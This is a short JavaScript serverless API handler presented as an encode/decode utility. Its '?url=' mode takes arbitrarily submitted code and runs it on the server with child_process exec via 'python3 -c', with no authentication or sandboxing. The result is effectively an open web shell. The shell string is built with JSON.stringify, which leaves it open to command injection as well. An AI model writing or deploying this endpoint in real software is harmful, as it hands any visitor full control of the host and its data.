export default async function handler(req, res) {
  const { query } = req;
  const memory = global.codes || {};
  global.codes = memory;

  if (query.encode) {
    const code = query.encode;
    const encoded = Buffer.from(code).toString('base64');
    const id = Math.random().toString(36).substring(2, 12);
    memory[id] = code;
    const scheme = req.headers['x-forwarded-proto'] || 'https';
    const url = `${scheme}://${req.headers.host}${req.url.split('?')[0]}?url=${id}`;
    return res.status(200).json({
      status: "success",
      type: "encode",
      encoded,
      test_url: url
    });
  }

  if (query.decode) {
    const decoded = Buffer.from(query.decode, 'base64').toString();
    return res.status(200).json({
      status: "success",
      type: "decode",
      decoded
    });
  }

  if (query.url) {
    const code = memory[query.url];
    if (!code) {
      return res.status(404).json({
        status: "error",
        message: "Code not found or expired"
      });
    }
    const { exec } = await import('child_process');
    exec(`python3 -c ${JSON.stringify(code)}`, (error, stdout, stderr) => {
      res.status(200).json({
        status: "success",
        type: "execute",
        output: stdout || stderr
      });
    });
    return;
  }

  res.status(400).json({
    status: "error",
    message: "Use ?encode= or ?decode= or ?url="
  });
}
